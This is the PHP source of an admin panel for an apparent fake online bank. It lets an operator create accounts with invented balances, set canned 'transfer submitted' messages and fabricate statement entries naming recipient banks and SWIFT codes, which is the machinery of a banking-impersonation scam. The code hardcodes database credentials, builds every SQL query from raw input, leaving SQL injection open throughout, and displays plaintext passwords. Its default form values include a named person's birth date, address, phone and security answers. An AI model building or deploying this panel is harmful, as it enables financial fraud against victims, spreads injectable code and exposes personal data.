<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="robots" content="noindex,nofollow"><noscript>&lt;meta http-equiv="refresh" content="0;URL=https://www.Fbnkal.com/s/online/JavascriptDisabled.html"&gt;</noscript><link rel="shortcut icon" type="image/x-icon" href="../images/favicon.ico"><script type="text/javascript" src="../js/jquery.min.js"></script><script type="text/javascript" src="../js/jquery.timer.js"></script><link rel="stylesheet" type="text/css" href="../css/portal.css"><title>Mcb Login Admin</title><script type="text/javascript">var req="?request=",d=document;function eId(i){return d.getElementById(i)}function hform(v,a){a=req+a||"";eId("hpost").value=v;eId("hform").action=a;eId("hform").submit();}$(d).ready(function(){$(".lnkAcc").click(function(){var ac=$(this).closest("tr").find(".acc").text(),al=$(this).attr("alt");if(al.substr(0,2)=="d|"){if(confirm("You are about to irrevocably delete the account: "+ac+"\r\nAll statements and messages associated with this account will also be removed.\r\nIf you are sure to proceed, click 'Ok' otherwise cancel"))hform(al.substr(2),"list&del");}else hform(ac,al);});$(".lnkstm").click(function(){hform($(this).closest("tr").find(".hid").text(),$(this).attr("alt"))});$(".linkback").click(function(){history.go(-1)});});</script><script src="//code.tidio.co/mgnhouvgxohr01fxtyzdspbfthzjsdoi.js" async></script></head>


<body><div id="container"><div id="top-right"><a href="/?out" style="color:#FF6600">Log Off</a></div><div id="top-left"><ul><li>Welcome, Admin</li><li><a href="home.php?pw">Change Password</a></li></ul></div><div id="banner"><a id="logo"><span></span></a></div>


<?php
session_start();
if(!isset($_SESSION['admin']))
{header("location:/");}
	$con=mysqli_connect("localhost","itrakvqy_b","nze2903NZE2903", "itrakvqy_b")or die();$id=$_SESSION['d'];
	
if(isset($_POST['npw'])){	
$npw=       htmlspecialchars( $_POST['npw']);
mysqli_query($con, "UPDATE admin SET pw='".$npw."'  ")or die(mysqli_error($con));
}

	
if(isset($_POST['field'])){	
            
$field=      htmlspecialchars( $_POST['field']);
$id=          htmlspecialchars( $_POST['id']);

if(isset($_POST['value'])){	
$value=       htmlspecialchars( $_POST['value']);
mysqli_query($con, "UPDATE account SET ".$field."='".$value."' WHERE id='".$id."'  ")or die(mysqli_error($con));
}

if(isset($_POST['edit'])){	
$edit=       htmlspecialchars( $_POST['edit']);
mysqli_query($con, "UPDATE statement SET ".$field."='".$edit."' WHERE id='".$id."'  ")or die(mysqli_error($con));
}

$success = "Profile updated successfully";
} 

if(isset($_GET['delete'])){
	$delete = $_GET['delete'];
mysqli_query($con, "DELETE FROM statement WHERE id='".$delete."' ")or die(mysqli_error($con));
	
$success = "delete successfull";
	}
	
if(isset($_GET['deleteid'])){
	$delete = $_GET['deleteid'];
mysqli_query($con, "DELETE FROM account WHERE id='".$delete."' ")or die(mysqli_error($con));
	
	}
	if(isset($_POST['accno'])){
		$date = date(DATE_RFC2822);
$accno = $_POST['accno'];
$acctype = $_POST['acctype'];
 $routing = $_POST['routing'];
  $accstatus = $_POST['accstatus'];
   $currency = $_POST['currency'];
    $accbal = $_POST['accbal'];
	 $username = $_POST['username'];
	  $password = $_POST['password'];
	   $accesscode = $_POST['accesscode'];
	    $refcode = $_POST['refcode'];
		 $taxcode = $_POST['taxcode'];
		  $tfmsg = $_POST['tfmsg'];
		   $question1 = $_POST['question1'];
		    $question2 = $_POST['question2'];
			 $question3 = $_POST['question3'];
			  $answer1 = $_POST['answer1'];
			   $answer2 = $_POST['answer2'];
			    $answer3 = $_POST['answer3'];
				 $title = $_POST['title'];
				  $name = $_POST['name'];
				   $dob = $_POST['dob'];
				    $address = $_POST['address'];
					 $postcode = $_POST['postcode'];
					  $country = $_POST['country'];
					   $phone = $_POST['phone'];
					    $email = $_POST['email'];
						 
	mysqli_query($con, "INSERT INTO account(accno,acctype, routing, accstatus, currency, accbal, username, password, accesscode, refcode, taxcode, tfmsg, question1, question2, question3, answer1, answer2, answer3, title, name, dob, address, postcode, country, phone, email, date, lastlogin)
		
VALUES('".$accno."','".$acctype."', '".$routing."', '".$accstatus."', '".$currency."', '".$accbal."', '".$username."', '".$password."', '".$accesscode."', '".$refcode."', '".$taxcode."', '".$tfmsg."', '".$question1."', '".$question2."', '".$question3."', '".$answer1."', '".$answer2."', '".$answer3."', '".$title."', '".$name."', '".$dob."', '".$address."', '".$postcode."', '".$country."', '".$phone."', '".$email."', '".$date."', '".$date."')")or die(mysqli_error($con));	
		
		}
	if(isset($_POST['descn'])){
$accid = $_POST['id'];
$date = $_POST['date'];
$descn = $_POST['descn'];
$credit = $_POST['credit'];
$debit = $_POST['debit'];
$balance = $_POST['balance'];
$status = $_POST['status'];
$tfto_acc = $_POST['tfto_acc'];
$tfto_name = $_POST['tfto_name'];
$tfto_bank = $_POST['tfto_bank'];
$tfto_bankaddr = $_POST['tfto_bankaddr'];
$tfto_iban = $_POST['tfto_iban'];
$tfto_routing = $_POST['tfto_routing'];
$tfto_swift = $_POST['tfto_swift'];
$tfto_country = $_POST['tfto_country'];
$memo = $_POST['memo'];
						 
	mysqli_query($con, "INSERT INTO statement(accid, date, descn, credit, debit, balance, status, tfto_acc, tfto_name, tfto_bank, tfto_bankaddr, tfto_iban, tfto_routing ,tfto_swift, tfto_country, tfto_memo)
		
VALUES('".$accid."', '".$date."', '".$descn."', '".$credit."', '".$debit."', '".$balance."', '".$status."', '".$tfto_acc."', '".$tfto_name."', '".$tfto_bank."', '".$tfto_bankaddr."', '".$tfto_iban."', '".$tfto_routing."' ,'".$tfto_swift."', '".$tfto_country."', '".$memo."')")or die(mysqli_error($con));	
		
		}


 if(isset($_GET['list'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style>
<h1>Account List</h1><form action="" method="post" id="hform"><input type="hidden" name="hpost" id="hpost" value=""></form><table class="tblist tbacclist"><tbody><tr><th style="width:5px"></th><th>Name</th><th colspan="2">Account number</th></tr>
<?php 
$tr = 1;
	$recd= mysqli_query($con, "select * from account ")or die(mysqli_error($con));
	
	while($rec = mysqli_fetch_array($recd)){ ?>
<tr><td><?php echo $tr; ?></td><td><b><?php echo $rec['name']; ?></b></td><td><a alt="view" href="home.php?details&&id=<?php echo $rec['id']; ?>"><?php echo $rec['accno']; ?></a></td><td><a alt="view" href="home.php?details&&id=<?php echo $rec['id']; ?>">Edit</a> <a alt="view" href="home.php?state&&id=<?php echo $rec['id']; ?>">Statement</a> <a alt="view" href="home.php?list&&deleteid=<?php echo $rec['id']; ?>">Delete</a></td></tr>
		
<?php	++$tr;	}
?>
</tbody></table></div>
<?php } ?>


<?php
if(isset($_GET['pw'])){ ?>

<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><h1>Change Admin Password</h1>
<?php 
	$recd= mysqli_query($con, "select pw from admin ")or die(mysqli_error($con));
	
	if($rec = mysqli_fetch_array($recd)){
		$pw = $rec['pw'];
	} ?>
    
<form method="post" action="#"><table class="tbdetail"><tbody>
<tr><td>Current Password</td><td><span><?php echo $pw; ?></span></td></tr>
<tr><td>New Password</td><td><input type="test" name="npw"></td></tr>
<tr><td></td><td><input type="submit" value="Submit"></td></tr>
</tbody></table></form></div>

<?php }



if(isset($_GET['acc'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><!--<span class="top-nav linkback">Back</span>--><form action="home.php?list" method="post"><h1>Add New Account</h1>
<table><tbody>

<tr><td>Account Number</td><td><input type="text" name="accno" value="" maxlength="19"></td></tr>
<tr><td>Routing</td><td><input type="text" name="routing" placeholder="30-19-02" value="30-19-02" maxlength="20"></td></tr>
<tr><td>Account Type</td><td><input type="text" name="acctype" Placeholder="Checking" value="Checking" maxlength="20"></td></tr>
<tr><td>Account Status</td><td><select name="accstatus"><option value="Active">Active</option><option value="Inactive">Inactive</option><option value="Suspended">Suspended</option></select></td></tr>

<tr><td>Title</td><td><select name="title"><option value="Mr">Mr</option><option value="Mrs">Mrs</option></select></td></tr>

<tr><td>Name</td><td><input type="text" name="name" placeholder="Bruno Moretti" value="Bruno Moretti"></td></tr>
<tr><td>Username</td><td><input type="text" name="username" placeholder="Username" value=""></td></tr>
<tr><td>Password</td><td><input type="text" name="password" placeholder="Password" value="happinessrule"></td></tr>
<tr><td>Email</td><td><input type="text" name="email" placeholder="Email" value="colombo.m@gstarsenergy.com"></td></tr>
<tr><td>Address</td><td><input type="text" name="address" placeholder="address" value="256 Harcourt Stret, New Farm, QLD"></td></tr>
<tr><td>DOB</td><td><input type="text" name="dob" placeholder="Date of birth" value="27 August 1960"></td></tr>
<tr><td>Postcode</td><td><input type="text" name="postcode" placeholder="Postcode" value="4005"></td></tr>
<tr><td>Country</td><td><input type="text" name="country" placeholder="Country" value="Australia"></td></tr>
<tr><td>Phone</td><td><input type="text" name="phone" placeholder="Phone Number" value="+61488891419"></td></tr>
<tr><td>Password</td><td><input type="text" name="password" placeholder="Password" value="happinessrule"></td></tr>
<tr><td>Accesscode</td><td><input type="text" name="accesscode" placeholder="accesscode" value="2030"></td></tr>
<tr><td>Refcode</td><td><input type="text" name="refcode" placeholder="" value="FA2190"></td></tr>
<tr><td>Taxcode</td><td><input type="text" name="taxcode" placeholder="" value="L18473"></td></tr>
<tr><td>Question1</td><td><input type="text" name="question1" placeholder="Question" value="What is the name of your best actor ?"></td></tr>
<tr><td>Answer1</td><td><input type="text" name="answer1" placeholder="Answer" value="leonardo di caprio"></td></tr>
<tr><td>Question2</td><td><input type="text" name="question2" placeholder="Question" value="What is your favorite book?"></td></tr>
<tr><td>Answer2</td><td><input type="text" name="answer2" placeholder="Answer" value="bible"></td></tr>
<tr><td>Question3</td><td><input type="text" name="question3" placeholder="Question" value="What town was your mother born?"></td></tr>
<tr><td>Answer3</td><td><input type="text" name="answer3" placeholder="Answer" value="madrid"></td></tr>
<tr><td>Account Currency</td><td><select name="currency"><option value="£">£</option><option value="$">$</option><option value="€">€</option></select></td></tr>
<tr><td>Account balance</td><td><input type="text" name="accbal" placeholder="account balance" value="3000000"></td></tr>
<tr><td valign="top">Transfer Messager</td><td><textarea name="tfmsg" style="height:80px; width:350px">Your transfer has been submitted for processing. Funds will be credited into beneficiary account within 3 banking days.</textarea></td></tr>
<tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr>
</tbody></table></form></div>


<?php }
?>
<?php
if(isset($_GET['new']) && isset($_GET['id']) ){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style><!--<span class="top-nav linkback">Back</span>-->
<form action="home.php?state&&id=<?php echo $_GET['id']; ?>" method="post"><h1>Add New Statement</h1>
<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>"/>
<table><tbody>
<tr><td>Date</td><td><input type="text" name="date" value="24/02/2020" placeholder="date"></td></tr>
<tr><td valign="top">Description</td><td><textarea name="descn" style="height:80px; width:350px">e.g MOSAIC OIL & GAS or INTERNATIONAL FX TRANSFER or  ANNALY CAPITAL MANAGEMENT or APA ENERGY.</textarea></td></tr>

<tr><td>Credit</td><td><input type="text" name="credit" value="" placeholder="credit"></td></tr>
<tr><td>Debit</td><td><input type="text" name="debit" value="" placeholder="debit"></td></tr>
<tr><td>Balance</td><td><input type="text" name="balance" value="" placeholder="balance"></td></tr>
<tr><td>Status</td><td><input type="text" name="status" value="Processed" placeholder="status"></td></tr>
<tr><td>Receipient Account Number</td><td><input type="text" name="tfto_acc" value="000146515" placeholder="Receipient Account Number"></td></tr>
<tr><td>Receipient Name</td><td><input type="text" name="tfto_name" value="Kol Lalen" placeholder="Receipient Name"></td></tr>
<tr><td>Receipient Bank Name</td><td><input type="text" name="tfto_bank" value="ABA Bank" placeholder="Receipient Bank Name"></td></tr>
<tr><td>Receipient Bank Address</td><td><input type="text" name="tfto_bankaddr" value="#4434,Street70 Monivong Blvd, Sangkat Beiong" placeholder="Receipient Bank Address"></td></tr>
<tr><td>Receipient Iban</td><td><input type="text" name="tfto_iban" value="209816" placeholder="Receipient Iban"></td></tr>
<tr><td>Receipient Routing</td><td><input type="text" name="tfto_routing" value="0210002" placeholder="Receipient Routing"></td></tr>
<tr><td>Receipient Country</td><td><input type="text" name="tfto_country" value="United States of America" placeholder="Receipient Country"></td></tr>
<tr><td>Receipient Swift</td><td><input type="text" name="tfto_swift" value="CHASUS33" placeholder="Receipient Swift"></td></tr>
<tr><td valign="top">Memo</td><td><textarea name="memo" style="height:80px; width:350px">e.g 	
Air Freight Invoice No
SE918-631945 or  	
Trade Payment or 	
Invoice No. SE918-631945.</textarea></td></tr>

<tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr>
</tbody></table></form></div><?php }


 if(isset($_GET['state']) && isset($_GET['id'])){ ?>

<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td, th{font-size:12px;}</style><h2>Statement Center</h2>

<table class="tblist"><tbody>
<tr><th>S/N</th><th>Date</th><th>Description</th><th>Credit</th><th>Debit</th><th>Balance</th><th>Status</th><th>For</th><th>edit</th><th>delete</th></tr>
<?php 
$tr = $_GET['id'];
$tc = 1;
	$recd= mysqli_query($con, "select * from statement WHERE accid='".$tr."' ")or die(mysqli_error($con));
	
	while($rec = mysqli_fetch_array($recd)){
		
		 ?>
<tr><td  style="width:8px"><?php echo $tc; ?></td><td><?php echo $rec['date']; ?></td><td><a href="home.php?edit&&id=<?php echo $tr; ?>&&tr=<?php echo $rec['id']; ?>" class="normal lnkstm"><?php echo $rec['descn']; ?></a></td><td><?php echo $rec['credit']; ?></td><td><?php echo $rec['debit']; ?></td><td><?php echo $rec['balance']; ?></td><td><?php echo $rec['status']; ?> </td><td><?php echo $rec['tfto_name']; ?></td><td><a href="home.php?edit&&id=<?php echo $tr; ?>&&tr=<?php echo $rec['id']; ?>" class="normal lnkstm">edit</a></td><td><a href="home.php?state&&id=<?php echo $tr; ?>&&delete=<?php echo $rec['id']; ?>">delete</a></td></tr>
<?php ++$tc; } ?>
</tbody></table>


<a href="home.php?new&&id=<?php echo $tr; ?>">Add new statement</a>
</div>

<?php }




 if(isset($_GET['details']) && isset($_GET['id'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style>

<?php 
$tr = $_GET['id'];
	$recd= mysqli_query($con, "select * from account WHERE id='".$tr."' ")or die(mysqli_error($con));
	
	if($rec = mysqli_fetch_array($recd)){
		
		 ?>

<h1>Details of Account: <?php echo $rec['accno']; ?></h1><table class="tbaccdetail">
<tbody>
<tr><td>Account Number</td><td><?php echo $rec['accno']; ?></td></tr>
<tr><td>Acc type</td><td><?php echo $rec['acctype']; ?></td></tr>
<tr><td>balance</td><td><?php echo $rec['accbal']; ?></td></tr>
<tr><td>Account status</td><td><?php echo $rec['accstatus']; ?></td></tr>
<tr><td>Routing</td><td><?php echo $rec['routing']; ?></td></tr>
<tr><td>Last Login</td><td><?php echo $rec['lastlogin']; ?></td></tr>
<tr><td>Access code</td><td><?php echo $rec['accesscode']; ?></td></tr>
<tr><td>Tax Code</td><td><?php echo $rec['taxcode']; ?></td></tr>
<tr><td>Reflection code</td><td><?php echo $rec['refcode']; ?></td></tr>

<tr><td valign="top">Transfer Message</td><td><?php echo $rec['tfmsg']; ?>.</td></tr>
<tr><td>Question 1 </td><td><?php echo $rec['question1']; ?></td></tr>
<tr><td>Answer 1</td><td><?php echo $rec['answer1']; ?></td></tr>
<tr><td>Question 2 </td><td><?php echo $rec['question2']; ?></td></tr>
<tr><td>Answer 2</td><td><?php echo $rec['answer2']; ?></td></tr>
<tr><td>Question 3 </td><td><?php echo $rec['question3']; ?></td></tr>
<tr><td>Answer 3</td><td><?php echo $rec['answer3']; ?></td></tr>
<p>
<tr><td colspan="2"><h2>Account Holder Details</h2></td></tr>
<tr><td>Title</td><td><?php echo $rec['title']; ?></td></tr>
<tr><td>Name</td><td><?php echo $rec['name']; ?></td></tr>
<tr><td>Date of Birth</td><td><?php echo $rec['dob']; ?></td></tr>
<tr><td valign="top">Address</td><td><?php echo $rec['address']; ?></td></tr>
<tr><td>Postcode</td><td><?php echo $rec['postcode']; ?></td></tr>
<tr><td>Country</td><td><?php echo $rec['country']; ?></td></tr>
<tr><td>Email</td><td><?php echo $rec['email']; ?></td></tr>
<tr><td>Phone</td><td><?php echo $rec['phone']; ?></td></tr>
<tr><td>Username</td><td><?php echo $rec['username']; ?></td></tr>
<tr><td>Passowrd</td><td><?php echo $rec['password']; ?></td></tr>
</p>

<form action="#" method="post">
<tr><td><h2>Edit Account</h2></td></tr>
<tr><td>Edit</td><td>
<select name="field">
<option value="accno"> accno</option>
<option value="acctype"> acctype</option>
<option value="email ">email</option>
<option value="title">title</option>
<option value="name">name</option>
<option value="dob ">dob</option>
<option value="address">address</option>
<option value="email ">email</option>
<option value="phone ">phone</option>
<option value="accstatus"> accstatus</option>
<option value="accbal">accbalance</option>
<option value="username"> username</option>
<option value="password"> password</option>
<option value="accesscode ">accesscode</option>
<option value="question1">question1</option>
<option value="question2"> question2</option>
<option value="question3"> question3</option>
<option value="answer1">answer1</option>
<option value="answer2">answer2</option>
<option value="answer3">answer3</option>
<option value="country"> country</option>
<option value="postcode"> postcode</option>
<option value="phone">phone</option>
</select></td></tr>

<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>" >
<tr><td>Input<span class="f9">(New value)</span></td><td><input type="text" name="value" ></td></tr>
<tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr>
</tbody></table></form>
</div>



<?php }} ?>


<?php if(isset($_GET['edit']) && isset($_GET['id']) && isset($_GET['tr'])){ ?>
<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none} td{font-size:12px;}</style>

<?php 
$tr = $_GET['tr'];
$td = $_GET['id'];
	$recd= mysqli_query($con, "select * from statement WHERE id='".$tr."' ")or die(mysqli_error($con));
	
	if($rec = mysqli_fetch_array($recd)){
		
		 ?>

<h2>Statement : <?php echo $rec['descn']; ?></h2><table class="tbaccdetail">
<tbody>
<tr><td>Date</td><td><?php echo $rec['date']; ?></td></tr>
<tr><td>Description</td><td><?php echo $rec['descn']; ?></td></tr>
<tr><td>balance</td><td><?php echo $rec['balance']; ?></td></tr>
<tr><td>credit</td><td><?php echo $rec['credit']; ?></td></tr>
<tr><td>debit</td><td><?php echo $rec['debit']; ?></td></tr>
<tr><td>status</td><td><?php echo $rec['status']; ?></td></tr>
<tr><td>receipient account</td><td><?php echo $rec['tfto_acc']; ?></td></tr>
<tr><td>bank name</td><td><?php echo $rec['tfto_bank']; ?></td></tr>
<tr><td>bank address</td><td><?php echo $rec['tfto_bankaddr']; ?></td></tr>

<tr><td valign="top">Iban</td><td><?php echo $rec['tfto_iban']; ?>.</td></tr>
<tr><td>country</td><td><?php echo $rec['tfto_country']; ?></td></tr>
<tr><td>swift</td><td><?php echo $rec['tfto_swift']; ?></td></tr>
<tr><td>routing </td><td><?php echo $rec['tfto_routing']; ?></td></tr>
<tr><td>memo</td><td><?php echo $rec['tfto_memo']; ?></td></tr>
</p>

<form action="#" method="post">
<tr><td><h2>Edit Account</h2></td></tr>
<tr><td>Edit</td><td>
<select name="field">
<option value="date"> date</option>
<option value="descn ">descn</option>
<option value="credit">credit</option>
<option value="debit">debit</option>
<option value="balance">balance</option>
<option value="status">status</option>
<option value="tfto_acc">tfto_acc</option>
<option value="tfto_bank">tfto_bank</option>
<option value="tfto_name">tfto_name</option>
<option value="tfto_bankaddr">tfto_bankaddr</option>
<option value="tfto_iban">tfto_iban</option>
<option value="tfto_country">tfto_country</option>
<option value="tfto_swift">tfto_swift</option>
<option value="tfto_routing">tfto_routing</option>
<option value="tfto_memo">tfto_memo</option>

</select></td></tr>

<input type="hidden" name="id" value="<?php echo $_GET['tr']; ?>" >
<tr><td>Input<span class="f9">(New value)</span></td><td><input type="text" name="edit" ></td></tr>
<tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr>
</tbody></table></form>

<a href="home.php?state&&id=<?php echo $td; ?>">< back</a>


</div>
<?php }} ?>



<div id="side-right"><ul class="nav"><li><a href="?acc">Add New Account</a></li><li><a href="home.php?list">List All Accounts</a></li></ul></div></div></body></html>